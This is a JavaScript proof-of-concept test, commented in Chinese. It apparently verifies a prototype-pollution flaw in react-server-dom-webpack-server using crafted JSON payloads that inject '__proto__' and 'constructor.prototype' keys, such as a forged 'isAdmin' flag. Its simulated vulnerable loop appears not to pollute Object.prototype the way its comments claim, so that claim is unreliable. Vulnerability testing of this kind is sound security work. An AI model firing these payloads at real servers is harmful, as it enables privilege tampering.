/**
 * 原型链污染漏洞验证测试
 * 
 * 此脚本用于验证 react-server-dom-webpack-server 中的原型链污染漏洞
 */

// 模拟 reviveModel 函数的关键逻辑
function simulateReviveModel(value) {
  const hasOwnProperty = Object.prototype.hasOwnProperty;
  
  if (typeof value === 'object' && value !== null) {
    if (Array.isArray(value)) {
      for (let i = 0; i < value.length; i++) {
        value[i] = simulateReviveModel(value[i]);
      }
    } else {
      // 这是存在漏洞的代码模式
      for (let i in value) {
        if (hasOwnProperty.call(value, i)) {
          // 问题：hasOwnProperty 不能防止 __proto__ 等属性
          const newValue = simulateReviveModel(value[i]);
          if (newValue !== undefined) {
            value[i] = newValue; // 危险：可能设置 __proto__
          } else {
            delete value[i]; // 危险：可能删除 __proto__
          }
        }
      }
    }
  }
  return value;
}

// 测试用例 1: __proto__ 污染
console.log('=== 测试用例 1: __proto__ 污染 ===');
const maliciousJSON1 = '{"__proto__":{"polluted":true,"isAdmin":true}}';
const parsed1 = JSON.parse(maliciousJSON1);

// 检查污染前
console.log('污染前 Object.prototype.polluted:', Object.prototype.polluted);

// 模拟处理
simulateReviveModel(parsed1);

// 检查污染后
console.log('污染后 Object.prototype.polluted:', Object.prototype.polluted);
console.log('污染后 Object.prototype.isAdmin:', Object.prototype.isAdmin);

// 验证影响
const testObj = {};
console.log('新对象 testObj.polluted:', testObj.polluted);
console.log('新对象 testObj.isAdmin:', testObj.isAdmin);

console.log('\n=== 测试用例 2: constructor.prototype 污染 ===');
// 重置原型
Object.prototype.polluted = undefined;
Object.prototype.isAdmin = undefined;

const maliciousJSON2 = '{"constructor":{"prototype":{"polluted2":true}}}';
const parsed2 = JSON.parse(maliciousJSON2);

console.log('污染前 Object.prototype.polluted2:', Object.prototype.polluted2);

simulateReviveModel(parsed2);

console.log('污染后 Object.prototype.polluted2:', Object.prototype.polluted2);

const testObj2 = {};
console.log('新对象 testObj2.polluted2:', testObj2.polluted2);

console.log('\n=== 测试用例 3: 嵌套对象污染 ===');
Object.prototype.polluted2 = undefined;

const maliciousJSON3 = '{"a":{"b":{"__proto__":{"nestedPolluted":true}}}}';
const parsed3 = JSON.parse(maliciousJSON3);

console.log('污染前 Object.prototype.nestedPolluted:', Object.prototype.nestedPolluted);

simulateReviveModel(parsed3);

console.log('污染后 Object.prototype.nestedPolluted:', Object.prototype.nestedPolluted);

const testObj3 = {};
console.log('新对象 testObj3.nestedPolluted:', testObj3.nestedPolluted);

console.log('\n=== 漏洞验证结果 ===');
if (Object.prototype.polluted || Object.prototype.isAdmin || 
    Object.prototype.polluted2 || Object.prototype.nestedPolluted) {
  console.log('❌ 漏洞确认：原型链已被污染！');
  console.log('建议：在 reviveModel 函数中添加属性过滤');
} else {
  console.log('✅ 未检测到污染（可能已被修复或需要特定环境）');
}

// 清理
delete Object.prototype.polluted;
delete Object.prototype.isAdmin;
delete Object.prototype.polluted2;
delete Object.prototype.nestedPolluted;
